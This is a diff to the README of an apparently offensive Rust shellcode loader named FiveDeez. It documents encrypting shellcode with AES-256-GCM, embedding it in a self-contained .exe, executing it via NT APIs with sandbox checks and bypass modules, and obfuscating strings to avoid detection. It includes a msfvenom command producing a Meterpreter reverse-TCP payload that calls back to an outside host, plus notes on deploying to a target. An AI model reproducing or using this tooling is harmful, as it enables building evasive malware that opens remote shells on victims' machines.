@@ -64,8 +64,9 @@ FiveDeez/
 │   └── src/main.rs
 └── src/
     ├── main.rs                   ← entrypoint / orchestration
-    ├── shellcode.rs              ← generated key + encrypted payload (auto-patched)
-    ├── crypto.rs                 ← AES-256-GCM decrypt
+    ├── shellcode.rs              ← generated KEY + NONCE (auto-patched by prepare.sh)
+    ├── payload.bin               ← encrypted payload (written + wiped by prepare.sh)
+    ├── crypto.rs                 ← embeds payload.bin via include_bytes!, AES-256-GCM decrypt
     ├── loader.rs                 ← NT API shellcode execution
     ├── timing.rs                 ← sleep jitter + sandbox check
     └── bypass/
@@ -79,7 +80,8 @@ FiveDeez/
 ## Usage
 
 `prepare.sh` handles everything in a single command: generates fresh AES-256
-keys, encrypts your shellcode, patches the source, and produces a named `.exe`.
+keys, encrypts your shellcode, embeds it in the binary, and produces a single
+self-contained `.exe`.
 
 ```bash
 ./prepare.sh -i <shellcode.bin> [-o <output_name>] [--debug]
@@ -98,34 +100,15 @@ keys, encrypts your shellcode, patches the source, and produces a named `.exe`.
 msfvenom -p windows/x64/meterpreter/reverse_tcp \
     LHOST=10.10.14.10 LPORT=4444 -f raw -o beacon.bin
 
-# Build the loader — fresh keys generated automatically
+# Build the loader — single self-contained .exe, fresh keys every run
 ./prepare.sh -i beacon.bin -o engagementX
 
-# Output: engagementX.exe  (unique key/nonce every run)
+# Output: engagementX.exe
 ```
 
-Every invocation produces a binary with a **unique AES-256 key, nonce, and
-ciphertext** — even from the same shellcode input.
-
----
-
-### Encrypt shellcode manually
-
-To produce the encrypted constants without building (e.g. to inspect the
-output or integrate into another workflow):
-
-```bash
-# Build the helper first
-cargo build -p encrypt_payload --release
-
-# Encrypt with your own key/nonce
-./target/release/encrypt_payload beacon.bin \
-    $(openssl rand -hex 32) \
-    $(openssl rand -hex 12)
-
-# Paste the printed KEY / NONCE / ENCRYPTED_SHELLCODE consts into src/shellcode.rs
-# then run: ./prepare.sh -i beacon.bin
-```
+The encrypted payload is embedded directly into the binary at link time via
+`include_bytes!` — no separate file to deploy. Every invocation generates a
+unique key, nonce, and ciphertext.
 
 ---
 
@@ -163,14 +146,11 @@ sleep entirely.
 
 ## Operational Notes
 
-- **Change nothing before use** — `prepare.sh` generates fresh keys on every
-  run; there are no hardcoded defaults in the shipped binary.
-- **`src/shellcode.rs` is auto-patched** by `prepare.sh` on every build. The
-  version tracked in git is an inert placeholder.
-- **No plaintext IOCs** — DLL/function name strings are obfuscated at compile
-  time via `obfstr` and decoded on the stack at runtime.
-- **`.exe` outputs and `.bin` shellcode files are gitignored** — they should
-  never be committed.
+- **Single file deploy** — the encrypted payload is embedded at link time via `include_bytes!`; only the `.exe` needs to be transferred to the target.
+- **Key never touches disk** — the AES-256 key and nonce are baked into the `.exe` at compile time; `src/payload.bin` is truncated back to empty immediately after the build.
+- **`src/shellcode.rs` is auto-patched** by `prepare.sh` and restored to an inert placeholder on exit — no key material ever lingers in the source tree.
+- **No plaintext IOCs** — DLL/function name strings are obfuscated at compile time via `obfstr` and decoded on the stack at runtime.
+- **`.exe` outputs and raw shellcode files are gitignored** — they should never be committed.
 
 ---
 
